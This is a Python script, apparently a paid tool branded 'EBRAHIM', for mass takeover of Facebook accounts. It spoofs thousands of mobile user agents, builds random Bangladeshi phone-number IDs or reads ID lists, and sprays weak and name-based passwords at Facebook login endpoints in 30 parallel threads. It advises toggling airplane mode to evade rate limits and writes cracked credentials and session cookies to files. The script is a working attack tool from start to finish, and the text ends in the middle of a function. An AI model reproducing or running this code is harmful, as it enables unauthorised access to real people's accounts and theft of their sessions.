#________________| IMPORT |________________#
from concurrent.futures import ThreadPoolExecutor as terd
import os,time,string,random,json,uuid,sys,re,requests
try:import pycurl, io
except:os.system('pip install pycurl')
try:import mechanize;br = mechanize.Browser()
except:os.system('pip install mechanize')
#________________| LOOP |________________#
user,lock,oks,cps,loop,pswrd,numbr,mtd=[],[],[],[],0,[],[],[]
usragent = []
ugen = []
#________________| RANDOM-UA |________________#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 
 ###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2012K11C'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['vivo 1002T'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['CPH2083'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  usragent.append(uakuh)
#________________| COLOUR |________________#
W = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#________________| LINEX |________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#________________| APPROVED |________________#
def approval():
  clear()
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://zero-143.blogspot.com/2024/03/blog-post.html?m=1').text#apnar Github Approved Link diben Akhne Ok
    if id in httpCaht:
      print(f"{G}[=] YOUR KEY IS APPROVED")
      msg = str(os.geteuid())
      time.sleep(0.5)
      menu()
      pass
    else:
      print(f"{G}[=] YOUR KEY :{W} {id}");linex()
      input(f'{G}[=] CLICK ENTER TO SENT KEY ADMIN FB ')
      exit()
  except:
    sys.exit()
#________________| LOGO |________________#
logo=(f"""{G}
             {G}┏┓┳┓┳┓┏┓┓┏┳┳┳┓
             {G}┣ ┣┫┣┫┣┫┣┫┃┃┃┃
             {G}┗┛┻┛┛┗┛┗┛┗┻┛ ┗
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G}[=] OWNER   : EBRAHIM MIAH
{G}[=] TOOL    : FILE X RANDM CLONING
{G}[=] VERSION : 0.0 {W} PAID
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#________________| MENU |________________#
def menu():
       clear()
       print(f"{G}[1] FILE CLONING")
       print(f"{G}[2] RANDOM CLONING")
       print(f"{G}[0] EXIT CLONING");linex()
       choice=input(f"{G}[?] CHOICE : ")
       if choice in ['1','01','A','a']:_file_()
       if choice in ['2','02','B','b']:_randm_()
       else:exit()
#________________| FILE |________________#
def _file_():
        clear()
        print(f"{G}[=] EXAMPLE : /sdcard/EBRAHIM.txt ");linex()
        filer=input(f"{G}[?] CHOICE  : ")
        try:fo=open(filer,'r').read().splitlines()
        except:_file_()
        clear()
        try:limit=int(input(f"{G}[?] PASSWORD LIMIT : "))
        except:limit = 1
        clear()
        for i in range(limit):
             passk = f"{G}[=] PASSWORD NO.{i+1} : "
             pswrd.append(input(passk))
        clear()
        print(f"{G}[1] MATHOD GRAPH ")
        print(f"{G}[2] MATHOD API ");linex()
        ho = input(f"{G}[?] CHOICE  : ")
        if ho in ['a','A','1','01']:mtd.append("A")
        elif ho in ['b','B','2','02']:mtd.append("B")
        else:mtd.append("A")
        with terd(max_workers=30) as creak:
             clear()
             tl = str(len(fo))
             print(f"{G}[=] TOTAL UID :{W} {tl}")
             print(f"{G}[=] USE AIRPLANE MODE ON/OFF EVERY 1 MINIT");linex()
             for user in fo:
                    try:
                         ids,names = user.split('|')
                    except:pass
                    pasx = pswrd
                    if 'A' in mtd:creak.submit(_M1_,ids,names,pasx,tl)
                    elif 'B' in mtd:creak.submit(_M2_,ids,names,pasx,tl)
        print(f"{G}[=] CLONING DONE")
        exit()
#________________| FILE-METHOD-M1 |________________#
def _M1_(ids,names,pasx,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{G}[EBRAHIM-M1] {loop} {len(oks)}|{len(cps)} ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
             ln = names.split(' ')[1]
        except:
             ln = fn
        try:
             for pak in pasx:
                    pas=pak.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                    random_seed=random.Random()
                    adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                    url = f"https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=3.0,width=1125,height=1366};FBLC/en_US;FBCR/A1;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vi"+"vo Y"+"9"+"3s;FBSV/13.7.4;FBCA/arm64-v8a:;]"
                    data = {"adid": adid,
                     "device_id": str(uuid.uuid4()),
                     "family_device_id": str(uuid.uuid4()),
                     "secure_family_device_id": str(uuid.uuid4()),
                     "advertiser_id": str(uuid.uuid4()),
                     "format": "json",
                     "cpl": "true",
                     "credentials_type": "device_based_login_password",
                     "error_detail_type": "button_with_disabled",
                     "source": "register_api",
                     "email": ids,
                     "password": pas,
                     "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                     "generate_session_cookies": "1",
                     "meta_inf_fbmeta": "NO_FILE",
                     "currently_logged_in_userid": "0",
                     "locale": "en_GB",
                     "client_country_code": "GB",
                     "method": "auth.login",
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d",
                     "sig": "cc331688c9ec07059af4df9dbdcf7737"}
                    head = {"User-Agent": ua,
                    "Accept-Encoding": "gzip,deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Host": "b-graph.facebook.com",
                    "Authorization": "OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                    "X-FB-Net-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-Client-IP": "True",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-Tigon-Is-Retry": "False",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Connection-Quality": "MOBILE.LTE",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "X-FB-Connection-Bandwidth": str(random.randrange(40000000, 90000000)),
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "795"}
                    po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
                    if 'session_key' in po:
                           uid = str(ids)
                           pwx = str(pas)
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{G}[EBRAHIM-OK] {uid} | {pwx}")
                           print(f"\r\r{G}[COKI-OK]{W} {uid} | {pwx}")
                           open("/sdcard/EBRAHIM-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            print(f"\r\r{Y}[EBRAHIM-CP] {uid} | {pwx}")
                            open('/sdcard/EBRAHIM-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
             loop+=1
        except Exception as e:
                 pass
#________________| FILE-METHOD-M2 |________________#
def _M2_(ids,names,pasx,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{G}[EBRAHIM-M2] {loop} {len(oks)}|{len(cps)} ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
             ln = names.split(' ')[1]
        except:
             ln = fn
        try:
             for pak in pasx:
                    pas=pak.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                    random_seed=random.Random()
                    adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                    url = f"https://api.facebook.com/auth/login"
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=3.0,width=1125,height=1366};FBLC/en_US;FBCR/A1;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vi"+"vo Y"+"9"+"3s;FBSV/13.7.4;FBCA/arm64-v8a:;]"
                    data = {
                                 "adid": str(uuid.uuid4()),
                                 "format": "json",
                                 "device_id": str(uuid.uuid4()),
                                 "cpl": "true",
                                 "family_device_id": str(uuid.uuid4()),
                                 "credentials_type": "device_based_login_password",
                                 "error_detail_type": "button_with_disabled",
                                 "source": "device_based_login",
                                 "email": ids,
                                 "password": pas,
                                 "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                                 "generate_session_cookies": "1",
                                 "meta_inf_fbmeta": "",
                                 "advertiser_id": str(uuid.uuid4()),
                                 "currently_logged_in_userid": "0",
                                 "locale": "en_US",
                                 "client_country_code": "US",
                                 "method": "auth.login",
                                 "fb_api_req_friendly_name": "authenticate",
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                 "api_key": "882a8490361da98702bf97a021ddc14d",
                    }
                    head = {
                                   "User-Agent": ua,
                                   "Accept-Encoding": "gzip, deflate",
                                   "Accept": "*/*",
                                   "Connection": "keep-alive",
                                   "Content-Type": "application/x-www-form-urlencoded",
                                   "Host": "graph.facebook.com",
                                   "X-FB-Net-HNI": str(random.randrange(20000, 40000)),
                                   "X-FB-SIM-HNI": str(random.randrange(20000, 40000)),
                                   "X-FB-Connection-Type": "MOBILE.LTE",
                                   "X-Tigon-Is-Retry": "False",
                                   "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                                   "x-fb-device-group": str(random.randrange(5000, 5900)),
                                   "X-FB-Friendly-Name": "ViewerReactionsMutation",
                                   "X-FB-Request-Analytics-Tags": "graphservice",
                                   "X-FB-HTTP-Engine": "Liger",
                                   "X-FB-Client-IP": "True",
                                   "X-FB-Server-Cluster": "True",
                                   "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                    }
                    po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
                    if 'session_key' in po:
                           uid = str(ids)
                           pwx = str(pas)
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{G}[EBRAHIM-OK] {uid} | {pwx}")
                           print(f"\r\r{G}[COKI-OK]{W} {uid} | {pwx}")
                           open("/sdcard/EBRAHIM-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            print(f"\r\r{Y}[EBRAHIM-CP] {uid} | {pwx}")
                            open('/sdcard/EBRAHIM-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
             loop+=1
        except Exception as e:
                 pass
#________________| RANDOM |________________#
def _randm_():
        clear()
        A = f"{G}[=] EXAMPLE : 017 | 018 | 019 | 016"
        B = f"{G}[?] CHOICE  : "
        C = f"{G}[=] EXAMPLE : 5000 | 1000 | 9999 | 99999"
        D = f"{G}[?] CHOICE  : "
        print(A);linex();code = input(B);clear()
        print(C);linex()
        try:
             LIMIT = int(input(D))
        except ValueError:
             LIMIT = 5000
        for number in range(LIMIT):
                coda = ''.join(random.choice(string.digits) for _ in range(2))
                codb = ''.join(random.choice(string.digits) for _ in range(2))
                nmp = ''.join(random.choice(string.digits) for _ in range(4))
                numbr.append(nmp)
        clear()
        print(f"{G}[1] MATHOD NORMAL ")
        print(f"{G}[2] MATHOD HOST ");linex()
        ho = input(f"{G}[?] CHOICE : ")
        if ho in ['a','A','1','01']:mtd.append("A")
        elif ho in ['b','B','2','02']:mtd.append("B")
        else:mtd.append("A")
        with terd(max_workers=30) as india:
                clear()
                tl = str(len(numbr))
                print(f"{G}[=] TOTAL UID :{W} {tl}")
                print(f"{G}[=] SIM CODE  :{W} {tl}")
                print(f"{G}[=] USE AIRPLANE MODE ON/OFF EVERY 1 MINIT");linex()
                for love in numbr:
                        uid = code+coda+codb+love
                        passlist = [coda+codb+love,codb+love,code+coda+codb,code+code,code+'123',code+'1234','Bangladesh','free fire','i love you']
                        if 'A' in mtd:india.submit(idpaslogin,uid,passlist,tl)
                        elif 'B' in mtd:india.submit(idpaslogin2,uid,passlist,tl)
        print(f"{G}[=] CLONING DONE")
        exit()
#________________| RANDOM-METHOD-M1 |________________#
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{G}[EBRAHIM-M1] {loop} {len(oks)}|{len(cps)} ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
                    free_fb = session.get('https://free.facebook.com').text
                    pro = random.choice(ugen)
                    data = {
                           'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': uid,
                    'pass': ps,
                    'login': 'Log In'}
                    head = {'User-Agent': pro,
                    'method': 'GET',
                    'scheme': 'https',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.facebook.com/',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://www.facebook.com',
                    'Alt-Used': 'www.facebook.com',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1'}
                    po = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=head,allow_redirects=False,verify=True).text
                    log_cookies=session.cookies.get_dict().keys()
                    if 'c_user' in log_cookies:
                           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                           uidx=re.findall("c_user=(.*);xs", coki)[0]
                           uid=str(uidx)
                           ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                           res=requests.get(ckk).text
                           if 'Photoshop' in res:
                                 print(f"\r\r{G}[EBRAHIM-OK] {uid} | {ps}")
                                 open("/sdcard/EBRAHIM-OK-COOKIE.txt","a").write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 pass
                    elif 'checkpoint' in log_cookies:
                            print(f"\r\r{Y}[EBRAHIM-CP] {uid} | {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
            loop+=1
        except Exception as e:
                 pass
#________________| RANDOM-METHOD-M2 |________________#
def idpaslogin2(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{G}[EBRAHIM-M2] {loop} {len(oks)}|{len(cps)} ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
                    free_fb = session.get('https://free.facebook.com').text
                    pro = random.choice(ugen)
                    data = {
                           'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': uid,
                    'pass': ps,
                    'login': 'Log In'}
                    head = {'User-Agent': pro,
                    'method': 'GET',
                    'scheme': 'https',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.facebook.com/',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://www.facebook.com',
                    'Alt-Used': 'www.facebook.com',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1'}
                    po = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=head,allow_redirects=False,verify=True).text
                    log_cookies=session.cookies.get_dict().keys()
                    if 'c_user' in log_cookies:
                           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                           uidx=re.findall("c_user=(.*);xs", coki)[0]
                           uid=str(uidx)
                           ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                           res=requests.get(ckk).text
                           if 'Photoshop' in res:
                                 print(f"\r\r{G}[EBRAHIM-OK] {uid} | {ps}")
                                 open("/sdcard/EBRAHIM-OK-COOKIE.txt","a").write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 pass
                    elif 'checkpoint' in log_cookies:
                            print(f"\r\r{Y}[EBRAHIM-CP] {uid} | {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
            loop+=1
